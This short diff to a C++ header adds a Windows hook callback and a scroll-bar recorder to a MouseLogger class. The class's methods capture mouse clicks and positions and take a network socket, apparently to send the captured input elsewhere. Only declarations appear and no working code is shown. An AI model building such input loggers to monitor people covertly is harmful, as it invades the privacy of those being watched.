@@ -5,6 +5,7 @@
 #include <iostream>
 #include <thread>
 #include "Client.h"
+#include <WinUser.h>
 
 class MouseLogger
 {
@@ -14,4 +15,7 @@ public:
 
 	void recordMouseClicks(SOCKET sock);
 	void recordMousePos(SOCKET sock);
+
+	static LRESULT CALLBACK startListen(int nCode, WPARAM wParam, LPARAM lParam);
+	void recordScrollBar(SOCKET sock);
 };
